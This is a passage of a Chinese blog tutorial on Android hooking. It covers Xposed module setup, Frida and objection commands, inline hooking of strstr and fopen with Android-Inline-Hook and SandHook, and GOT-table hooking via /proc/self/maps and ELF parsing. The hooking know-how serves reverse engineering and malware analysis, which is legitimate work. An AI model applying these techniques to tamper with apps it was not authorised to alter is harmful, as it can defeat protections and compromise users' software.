class=\"string\">&quot;Xposed01&quot;</span>,loadPackageParam.packageName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>新建assets文件夹，然后在assets目录下新建文件xposed_init,在里面写上hook类的完整路径</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/24.png\" alt=\"image-20210919152200104\"></p>\n<p>这里面可以写多个hook类，每个类写一个，我们就完成了基本的Xposed框架的编写</p>\n<p>最后勾选模块，并重启即可生效</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/25.png\" alt=\"image-20210919152200104\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/26.png\" alt=\"image-20210919152200104\"></p>\n<p>我们可以发现我们的xposed插件生效了，将我们系统中进程名打印出来了,说明hook成功了</p>\n<h3 id=\"2-frida-hook实操\"><a href=\"#2-frida-hook实操\" class=\"headerlink\" title=\"2.frida hook实操\"></a>2.frida hook实操</h3><h4 id=\"（1）环境安装-1\"><a href=\"#（1）环境安装-1\" class=\"headerlink\" title=\"（1）环境安装\"></a>（1）环境安装</h4><p>frida安装，使用frida过程中我们可以安装objection来进一步助力我们的hook工作，这个参考肉丝大佬的知识星球</p>\n<p>工具安装（也可以选用其他版本）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install frida==12.8.0</span><br><span class=\"line\">pip install frida-tools==5.3.0</span><br><span class=\"line\">pip install objection==1.8.4</span><br></pre></td></tr></table></figure>\n\n<p>安装成功后，查看frida和objection，确定版本正确</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">frida --version</span><br><span class=\"line\">objection --help</span><br></pre></td></tr></table></figure>\n\n<p>然后将frida_server推送到<code>/data/local/tmp</code>下，并启动：（下载地址：<a href=\"https://github.com/frida/frida/releases%EF%BC%89\">https://github.com/frida/frida/releases）</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/27.png\" alt=\"image-20220517153822302\"></p>\n<h4 id=\"（2）frida使用\"><a href=\"#（2）frida使用\" class=\"headerlink\" title=\"（2）frida使用\"></a>（2）frida使用</h4><p>然后我们就可以使用自动化工具objection和编写js脚本进行hook了</p>\n<p>objection使用（详细参考肉丝大佬github的教程）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">常见的hook命令：</span><br><span class=\"line\">objection -g com.<span class=\"property\">android</span>.<span class=\"property\">settings</span> explore  <span class=\"comment\">//注入设置应用</span></span><br><span class=\"line\">android hooking list activities  <span class=\"comment\">//查看Activity，service相同</span></span><br><span class=\"line\">android intent launch_activity com.<span class=\"property\">android</span>.<span class=\"property\">settings</span>.<span class=\"property\">DisplaySettings</span>  <span class=\"comment\">//实现Activity跳转</span></span><br><span class=\"line\">android heap search instances com.<span class=\"property\">android</span>.<span class=\"property\">settings</span>.<span class=\"property\">DisplaySettings</span>   <span class=\"comment\">//搜索类的实例</span></span><br><span class=\"line\">android heap execute <span class=\"number\">0x2526</span> getPreferenceScreenResId    <span class=\"comment\">//主动调用实例</span></span><br><span class=\"line\">android hooking list classes  <span class=\"comment\">//列出内存中所有类</span></span><br><span class=\"line\">android hooking search methods display  <span class=\"comment\">//列出内存中所有的方法</span></span><br><span class=\"line\">android hooking watch <span class=\"keyword\">class</span> <span class=\"title class_\">android</span>.<span class=\"property\">bluetooth</span>.<span class=\"property\">BluetoothDevice</span>  <span class=\"comment\">//hook相关类的所有方法</span></span><br><span class=\"line\">android hooking watch class_method android.<span class=\"property\">bluetooth</span>.<span class=\"property\">BluetoothDevice</span>.<span class=\"property\">getName</span> --dump-args --dump-<span class=\"keyword\">return</span> --dump-backtrace  <span class=\"comment\">//打印具体方法的参数、返回值、堆栈信息</span></span><br></pre></td></tr></table></figure>\n\n<p>编写脚本：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/28.png\" alt=\"image-20220517154213936\"></p>\n<p>启动方式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">attach方式 frida -U com.example.test -l hook.js</span><br><span class=\"line\">spwan启动 frida -U -f com.example.test -l demo1.js --no-pause</span><br></pre></td></tr></table></figure>\n\n<p>这样我们就可以成功注入了，更加复杂的脚本编写可以参考<a href=\"https://github.com/hookmaster/frida-all-in-one\">frida博客</a></p>\n<p>详细案例实操，这里可以参考之前我的文章:<a href=\"https://bbs.pediy.com/thread-269128.htm\">Android恶意样本分析——frida破解三层锁机样本</a></p>\n<h3 id=\"3-inlinehook实操\"><a href=\"#3-inlinehook实操\" class=\"headerlink\" title=\"3.inlinehook实操\"></a>3.inlinehook实操</h3><p>这里我们分别实现基于inlinehook的两个开源框架的具体使用方法</p>\n<h4 id=\"（1）Android-lnine-Hook\"><a href=\"#（1）Android-lnine-Hook\" class=\"headerlink\" title=\"（1）Android-lnine-Hook\"></a>（1）Android-lnine-Hook</h4><p>开源地址：<a href=\"https://github.com/ele7enxxh/Android-Inline-Hook\">https://github.com/ele7enxxh/Android-Inline-Hook</a></p>\n<p>该框架只能针对32位的so文件进行hook</p>\n<p>我们对so文件进行hook时，可以按照如下步骤进行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）查看so文件中的目标函数</span><br><span class=\"line\">（2）编写Xposed hook代码，hook目标程序</span><br><span class=\"line\">（3）编写so层hook代码，hook so中的函数地址</span><br><span class=\"line\">（4）链接Java层和so层</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-1-gt-编写目标函数so文件\"><a href=\"#lt-1-gt-编写目标函数so文件\" class=\"headerlink\" title=\"&lt;1&gt;编写目标函数so文件\"></a>&lt;1&gt;编写目标函数so文件</h5><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/29.png\" alt=\"image-20220517160033161\"></p>\n<p>我们编写案例，很明显这里会打印失败，然后我们使用inline-hook框架进行hook</p>\n<h5 id=\"lt-2-gt-导入文件\"><a href=\"#lt-2-gt-导入文件\" class=\"headerlink\" title=\"&lt;2&gt;导入文件\"></a>&lt;2&gt;导入文件</h5><p>我们将该框架中如下文件导入我们的项目中</p>\n<p>我们需要使用<a href=\"https://github.com/ele7enxxh/Android-Inline-Hook\">inlineHook</a>文件夹，并把这些文件直接拷贝到我们的工作目录：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/30.png\" alt=\"image-20210919152200104\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/31.png\" alt=\"image-20210919152200104\"></p>\n<h5 id=\"lt-3-gt-修改配置文件\"><a href=\"#lt-3-gt-修改配置文件\" class=\"headerlink\" title=\"&lt;3&gt;修改配置文件\"></a>&lt;3&gt;修改配置文件</h5><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/32.png\" alt=\"image-20220517160824232\"></p>\n<h5 id=\"lt-4-gt-编写hook代码\"><a href=\"#lt-4-gt-编写hook代码\" class=\"headerlink\" title=\"&lt;4&gt;编写hook代码\"></a>&lt;4&gt;编写hook代码</h5><p>我们导入inlinehook头文件就可以开始编写hook代码了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/33.png\" alt=\"image-20220517160918834\"></p>\n<p>编译，报错：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/34.png\" alt=\"image-20220517163117937\"></p>\n<p>这是因为框架仅仅针对32位，所以我们需要在配置文件里面指定一下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/35.png\" alt=\"image-20220517163519977\"></p>\n<p>然后编译，发现能正常通过</p>\n<p>首先声明hook的就函数，然后编写对应的新函数，这里我们hook的是<code>strstr函数</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/36.png\" alt=\"image-20220517185051670\"></p>\n<p>然后调用inlinehook进行hook</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/37.png\" alt=\"image-20220517185429734\"></p>\n<p>最后我们发现就可以成功的hook</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/38.png\" alt=\"image-20220517185538606\"></p>\n<p>代码分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">源码解析：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）dlopen：该函数将打开一个新库，并把它装入内存</span><br><span class=\"line\">\t\t<span class=\"keyword\">void</span> *dlopen(const <span class=\"type\">char</span> *filename, <span class=\"type\">int</span> flag);</span><br><span class=\"line\">\t\t参数<span class=\"number\">1</span>：文件名就是一个动态库so文件，标志位：RTLD_NOW 的话，则立刻计算；设置的是 RTLD_LAZY，则在需要的时候才计算</span><br><span class=\"line\">\t\tlibc.so是一个共享库</span><br><span class=\"line\">\t\t======================</span><br><span class=\"line\">\t\t参数中的 libname 一般是库的全路径，这样 dlopen 会直接装载该文件；如果只是指定了库名称，在 dlopen 会按照下面的机制去搜寻：</span><br><span class=\"line\">\t\t根据环境变量 LD_LIBRARY_PATH 查找</span><br><span class=\"line\">\t\t根据 /etc/ld.so.cache 查找</span><br><span class=\"line\">\t\t查找依次在 /lib 和 /usr/lib 目录查找。</span><br><span class=\"line\">\t\tflag 参数表示处理未定义函数的方式，可以使用 RTLD_LAZY 或 RTLD_NOW 。 RTLD_LAZY 表示暂时不去处理未定义函数，先把库装载到内存，等用到没定义的函数再说； RTLD_NOW 表示马上检查是否存在未定义的函数，若存在，则 dlopen 以失败告终。</span><br><span class=\"line\">\t\t参考链接：https:<span class=\"comment\">//blog.nowcoder.net/n/5b2c04bbcccf431e9f1ab34aa02717fe</span></span><br><span class=\"line\">\t\t=======================</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）dlsym:在 dlopen 之后，库被装载到内存。 dlsym 可以获得指定函数( symbol )在内存中的位置(指针)。</span><br><span class=\"line\">\t\t <span class=\"keyword\">void</span> *dlsym(<span class=\"keyword\">void</span> *handle,const <span class=\"type\">char</span> *symbol);</span><br><span class=\"line\">\t\t 参数<span class=\"number\">1</span>：文件句柄  参数<span class=\"number\">2</span>：函数名</span><br></pre></td></tr></table></figure>\n\n<p>inlinehook框架使用正确姿势：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们对一个目标so文件hook步骤如下：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）我们获取so的handler，使用dlopen函数</span><br><span class=\"line\">\t\t<span class=\"keyword\">void</span>* libhandler = dlopen(<span class=\"string\">&quot;libc.so&quot;</span>,RTLD_NOW);</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）我们获取hook目标函数的地址,使用dlsym函数</span><br><span class=\"line\">\t\t<span class=\"keyword\">void</span>* strstr_addr = dlsym(libhandler,函数名);</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）声明原来的函数</span><br><span class=\"line\">\t\t<span class=\"keyword\">void</span>* (*oldmethod)*(<span class=\"type\">char</span>*,<span class=\"type\">char</span>*); <span class=\"comment\">//这个格式需要参考hook的函数</span></span><br><span class=\"line\">\t\t声明现在的函数</span><br><span class=\"line\">\t\t<span class=\"keyword\">void</span>* newmethod(<span class=\"type\">char</span>* a,<span class=\"type\">char</span>* b)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">void</span> *)oldmethod(a,b);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）使用registerInlinehook进行重定向，将hook函数地址重定向我们编写的新函数上</span><br><span class=\"line\">\t\t(registerInlineHook((uint32_t) strstr_addr, (uint32_t) new_strstr, (uint32_t **) &amp;old_strstr) != ELE7EN_OK</span><br><span class=\"line\">\t\t<span class=\"comment\">//参数一：hook函数的地址 参数二：替换函数的地址  参数3：用来保存原来函数的地址</span></span><br><span class=\"line\">\t（<span class=\"number\">5</span>）我们判断我们的hook操作是否成功,并且再次调用实现hook </span><br><span class=\"line\">\t\t(inlineHook((uint32_t) strstr_addr) == ELE7EN_OK)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）SandHook实操\"><a href=\"#（2）SandHook实操\" class=\"headerlink\" title=\"（2）SandHook实操\"></a>（2）SandHook实操</h4><p>因为上面使用inline框架只支持32位，所以这里我们用SandHook实现对64位native函数的hook，<a href=\"https://github.com/asLody/SandHook\">sandHook</a>既支持32位、又支持64位</p>\n<p>开源地址：<a href=\"https://github.com/asLody/SandHook\">https://github.com/asLody/SandHook</a></p>\n<p>同样是上面的案例，这里我们使用SandHook进行实操</p>\n<h5 id=\"lt-1-gt-导入文件\"><a href=\"#lt-1-gt-导入文件\" class=\"headerlink\" title=\"&lt;1&gt;导入文件\"></a>&lt;1&gt;导入文件</h5><p>我们此路径下<code>SandHook/nativehook/src/main/cpp/</code>文件全部导入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/39.png\" alt=\"image-20220517191708611\"></p>\n<h5 id=\"lt-2-gt-配置环境\"><a href=\"#lt-2-gt-配置环境\" class=\"headerlink\" title=\"&lt;2&gt;配置环境\"></a>&lt;2&gt;配置环境</h5><p>首先我们在CMakeList中加入c文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/40.png\" alt=\"image-20220517192031241\"></p>\n<p>然后在java代码中修改导入的so库</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/41.png\" alt=\"image-20220517192224416\"></p>\n<p>直接编译，报错：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/42.png\" alt=\"image-20220517192315719\"></p>\n<p>然后我们同理将配置信息加入：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmake &#123;</span><br><span class=\"line\">    arguments <span class=\"string\">&#x27;-DBUILD_TESTING=OFF&#x27;</span></span><br><span class=\"line\">    cppFlags <span class=\"string\">&quot;-frtti -fexceptions -Wpointer-arith&quot;</span></span><br><span class=\"line\">    abiFilters <span class=\"string\">&#x27;armeabi-v7a&#x27;</span>, <span class=\"string\">&#x27;arm64-v8a&#x27;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再次编译成功</p>\n<h5 id=\"lt-3-gt-编写hook代码\"><a href=\"#lt-3-gt-编写hook代码\" class=\"headerlink\" title=\"&lt;3&gt;编写hook代码\"></a>&lt;3&gt;编写hook代码</h5><p>SandHook使用和上面inlinehook框架基本一样</p>\n<p>首先声明旧的函数，编写新的函数（目标函数strstr）</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/43.png\" alt=\"image-20220517193411921\"></p>\n<p>然后进行hook</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/44.png\" alt=\"image-20220517193556517\"></p>\n<p>最后发现可以成功hook</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/45.png\" alt=\"image-20220517193629093\"></p>\n<p>SandHook使用姿势：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）导包，将SandHook中cpp文件夹下的包全部导入到项目中，并修改CMakeLists.txt中添加<span class=\"keyword\">native</span>.cpp, 修改java层导入so库为sandHook-<span class=\"keyword\">native</span></span><br><span class=\"line\">（<span class=\"number\">2</span>）配置相关的环境</span><br><span class=\"line\">\t在配置文件build.gradle中配置</span><br><span class=\"line\">\texternalNativeBuild &#123;</span><br><span class=\"line\">\t      cmake &#123;</span><br><span class=\"line\">\t\targuments <span class=\"string\">&#x27;-DBUILD_TESTING=OFF&#x27;</span></span><br><span class=\"line\">\t\tcppFlags <span class=\"string\">&quot;-frtti -fexceptions -Wpointer-arith&quot;</span></span><br><span class=\"line\">\t\tabiFilters <span class=\"string\">&#x27;armeabi-v7a&#x27;</span>, <span class=\"string\">&#x27;arm64-v8a&#x27;</span></span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">（<span class=\"number\">3</span>）编译可以成功通过</span><br><span class=\"line\">（<span class=\"number\">4</span>）使用</span><br><span class=\"line\">\tconst <span class=\"type\">char</span> * libc = <span class=\"string\">&quot;/system/lib64/libc.so&quot;</span>;</span><br><span class=\"line\">\told_fopen = reinterpret_cast&lt;<span class=\"keyword\">void</span> *(*)(<span class=\"type\">char</span> *, <span class=\"type\">char</span> *)&gt;(SandInlineHookSym(libc, <span class=\"string\">&quot;fopen&quot;</span>,</span><br><span class=\"line\">                                                                         reinterpret_cast&lt;<span class=\"keyword\">void</span> *&gt;(new_fopen)));</span><br><span class=\"line\">参数<span class=\"number\">2</span>：hook的函数 参数<span class=\"number\">3</span>：新的函数</span><br><span class=\"line\"></span><br><span class=\"line\">添加原理hook旧函数的声明</span><br><span class=\"line\"><span class=\"keyword\">void</span>* (*old_fopen)(<span class=\"type\">char</span>*,<span class=\"type\">char</span>*);</span><br><span class=\"line\">实现新的函数功能</span><br><span class=\"line\"><span class=\"keyword\">void</span>* new_fopen(<span class=\"type\">char</span>* a,<span class=\"type\">char</span>* b)&#123;</span><br><span class=\"line\">    __android_log_print(<span class=\"number\">6</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;I am from new open %s&quot;</span>,a);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> old_fopen(a,b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">（<span class=\"number\">5</span>）运行测试是否成功启动</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-PLT-x2F-GOT-hook实操\"><a href=\"#4-PLT-x2F-GOT-hook实操\" class=\"headerlink\" title=\"4.PLT&#x2F;GOT hook实操\"></a>4.PLT&#x2F;GOT hook实操</h3><p>前面我们已经介绍了Got表hook的原理，下面我们实例操作一下导入表函数的hook</p>\n<p>参考博客：<a href=\"https://www.cnblogs.com/goodhacker/p/9306997.html\">https://www.cnblogs.com/goodhacker/p/9306997.html</a></p>\n<p>原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">通过解析elf格式，分析Section header table找出静态的.got表的位置，并在内存中找到相应的.got表位置，这个时候内存中.got表保存着导入函数的地址，读取目标函数地址，与.got表每一项函数入口地址进行匹配，找到的话就直接替换新的函数地址，这样就完成了一次导入表的Hook操作了</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/46.png\" alt=\"image-20220517193556517\"></p>\n<p>首先，我们编写demo</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/47.png\" alt=\"image-20220517193556517\"></p>\n<p>我们编译后使用010Editor打开<code>libnative-lib.so</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/48.png\" alt=\"image-20220517193556517\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/49.png\" alt=\"image-20220517193556517\"></p>\n<p>然后我们用ida打开，并直接跳转到该地址</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/50.png\" alt=\"image-20220517193556517\"></p>\n<p>在got表中我们找到对应的mywin0函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/51.png\" alt=\"image-20220517193556517\"></p>\n<h5 id=\"lt-1-gt-获得so模块的加载地址\"><a href=\"#lt-1-gt-获得so模块的加载地址\" class=\"headerlink\" title=\"&lt;1&gt;获得so模块的加载地址\"></a>&lt;1&gt;获得so模块的加载地址</h5><p>我们可以使用<code>/proc/self/maps</code>去获得so模块的加载地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> line[<span class=\"number\">1024</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> *start;</span><br><span class=\"line\">    <span class=\"type\">int</span> *end;</span><br><span class=\"line\">    <span class=\"type\">int</span> n=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//1.拿到so的起始地址</span></span><br><span class=\"line\"><span class=\"comment\">//    749e5d7000-749e5db000 r--p 000f4000 103:09 441                           /system/bin/linker64</span></span><br><span class=\"line\"><span class=\"comment\">//    749e5db000-749e5dc000 rw-p 000f8000 103:09 441                           /system/bin/linker64</span></span><br><span class=\"line\">    FILE *fd = fopen(<span class=\"string\">&quot;/proc/self/maps&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (fgets(line,<span class=\"keyword\">sizeof</span>(line),fd))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">strstr</span>(line,<span class=\"string\">&quot;libnative-lib.so&quot;</span>))&#123;</span><br><span class=\"line\">            __android_log_print(<span class=\"number\">6</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;%s&quot;</span>,line);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">                start = reinterpret_cast&lt;<span class=\"type\">int</span> *&gt;(strtoul(strtok(line, <span class=\"string\">&quot;-&quot;</span>),<span class=\"literal\">NULL</span>,<span class=\"number\">16</span>));</span><br><span class=\"line\">                end = reinterpret_cast&lt;<span class=\"type\">int</span> *&gt;(strtoul(strtok(<span class=\"literal\">NULL</span>, <span class=\"string\">&quot; &quot;</span>),<span class=\"literal\">NULL</span>,<span class=\"number\">16</span>));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                strtok(line,<span class=\"string\">&quot;-&quot;</span>);</span><br><span class=\"line\">                end = reinterpret_cast&lt;<span class=\"type\">int</span> *&gt;(strtoul(strtok(<span class=\"literal\">NULL</span>, <span class=\"string\">&quot; &quot;</span>),<span class=\"literal\">NULL</span>,<span class=\"number\">16</span>));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            n++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-找到got表的位置\"><a href=\"#lt-2-gt-找到got表的位置\" class=\"headerlink\" title=\"&lt;2&gt;找到got表的位置\"></a>&lt;2&gt;找到got表的位置</h5><p>我们首先根据段头找到section_header的首地址</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/52.png\" alt=\"image-20220517193556517\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/53.png\" alt=\"image-20220517193556517\"></p>\n<p>然后我们遍历这个表就可以找到.got,然后根据got表地址再轮训找到函数地址</p>\n<p>因为这种方法不能在内存中直接找到段头，内存中会抹去段头，所以我们可以通过加载so文件来定位</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/54.png\" alt=\"image-20220517193556517\"></p>\n<h5 id=\"lt-3-gt-定位到节表的地址\"><a href=\"#lt-3-gt-定位到节表的地址\" class=\"headerlink\" title=\"&lt;3&gt;定位到节表的地址\"></a>&lt;3&gt;定位到节表的地址</h5><p>然后我们来获得节表的地址：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//读取elf文件</span></span><br><span class=\"line\">    Elf64_Ehdr ehd;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">fp</span> <span class=\"operator\">=</span>open(<span class=\"string\">&quot;/data/local/tmp/libnative-lib.so&quot;</span>, O_RDONLY);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(fp == -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        __android_log_print(<span class=\"number\">4</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;%s&quot;</span>,<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//读取elf文件的文件头</span></span><br><span class=\"line\">    read(fp,&amp;ehd,sizeof(Elf64_Ehdr));</span><br><span class=\"line\">    <span class=\"comment\">//读取节表的地址</span></span><br><span class=\"line\">    unsigned <span class=\"type\">long</span> <span class=\"variable\">shof</span> <span class=\"operator\">=</span> ehd.e_shoff;</span><br><span class=\"line\">    <span class=\"comment\">//读取节表的数量</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">shnum</span> <span class=\"operator\">=</span> ehd.e_shnum;</span><br><span class=\"line\">    <span class=\"comment\">//读取每个节表的大小</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">shsize</span> <span class=\"operator\">=</span> ehd.e_ehsize;</span><br><span class=\"line\">    <span class=\"comment\">//记录一下str表的偏移，主要是获取后面got的字符串值</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">shstr</span> <span class=\"operator\">=</span> ehd.e_shstrndx;</span><br></pre></td></tr></table></figure>\n\n<p>我们打印一下此事shof的值，验证一下节表的地址</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/55.png\" alt=\"image-20220517193556517\"></p>\n<p>这里可以发现成功读取</p>\n<h5 id=\"lt-4-gt-定位到got表的位置和函数位置\"><a href=\"#lt-4-gt-定位到got表的位置和函数位置\" class=\"headerlink\" title=\"&lt;4&gt;定位到got表的位置和函数位置\"></a>&lt;4&gt;定位到got表的位置和函数位置</h5><p>然后我们拿到字符串的偏移值进行定位到got表，再进一步定位到函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2.拿到字符串表</span></span><br><span class=\"line\">    Elf64_Shdr shdr;</span><br><span class=\"line\">    <span class=\"comment\">//定位字符串，节表地址加字符串表偏移×节表个数</span></span><br><span class=\"line\">    lseek(fp,shof+shstr*shsize,SEEK_SET);</span><br><span class=\"line\">    <span class=\"comment\">//此时节表就定位到字符串表开头</span></span><br><span class=\"line\">    read(fp,&amp;shdr,shsize);</span><br><span class=\"line\">    <span class=\"comment\">//分配一个字符串表大小</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* strtable = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(shdr.sh_size);</span><br><span class=\"line\">    __android_log_print(<span class=\"number\">6</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;shdrsize %p&quot;</span>,shdr.sh_offset);</span><br><span class=\"line\">    <span class=\"comment\">//将字符串片指针移动到0x34104上</span></span><br><span class=\"line\">    lseek(fp,shdr.sh_offset,SEEK_SET);</span><br><span class=\"line\">    read(fp,strtable,shdr.sh_size);</span><br><span class=\"line\">    <span class=\"comment\">//将指针移动到节表开头</span></span><br><span class=\"line\">    lseek(fp,shof,SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//遍历查找到got</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;shnum;i++)&#123;</span><br><span class=\"line\">        <span class=\"comment\">//从节表开头开始读取字符串，每次读取一个节表</span></span><br><span class=\"line\">        read(fp,&amp;shdr,shsize);</span><br><span class=\"line\">        <span class=\"comment\">//通过节表的索引找到字符串表中对应的值</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">strcmp</span>(&amp;strtable[shdr.sh_name], <span class=\"string\">&quot;.got&quot;</span>)==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//定位到got表的地址</span></span><br><span class=\"line\">            <span class=\"type\">int</span>* saddr = start+shdr.sh_addr/<span class=\"number\">4</span>;</span><br><span class=\"line\">            <span class=\"comment\">//整个got表的大小</span></span><br><span class=\"line\">            <span class=\"type\">int</span> size = shdr.sh_size;</span><br><span class=\"line\">            <span class=\"comment\">//遍历got表中的函数</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;size;j=j+<span class=\"number\">8</span>)&#123;</span><br><span class=\"line\">                <span class=\"type\">uint64_t</span>  value = *(<span class=\"type\">uint64_t</span> *)(saddr + j / <span class=\"number\">4</span>);</span><br><span class=\"line\">                <span class=\"comment\">//找到mywind的地址</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(reinterpret_cast&lt;<span class=\"type\">uint64_t</span>&gt;(mywin0) == value)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    __android_log_print(<span class=\"number\">6</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;value %p&quot;</span>,value);</span><br><span class=\"line\">                    <span class=\"comment\">//替换mywind地址</span></span><br><span class=\"line\">                    <span class=\"comment\">// 获取当前内存分页的大小</span></span><br><span class=\"line\">                    <span class=\"type\">uint64_t</span> page_size = getpagesize();</span><br><span class=\"line\">                    <span class=\"comment\">// 获取内存分页的起始地址（需要内存对齐）</span></span><br><span class=\"line\">                    <span class=\"comment\">//page要保护的是函数的绝对地址，而不是相对地址</span></span><br><span class=\"line\">                    <span class=\"type\">uint64_t</span> entry_page_start = (<span class=\"type\">uint64_t</span>)(saddr+j/<span class=\"number\">4</span>) &amp; (~(page_size - <span 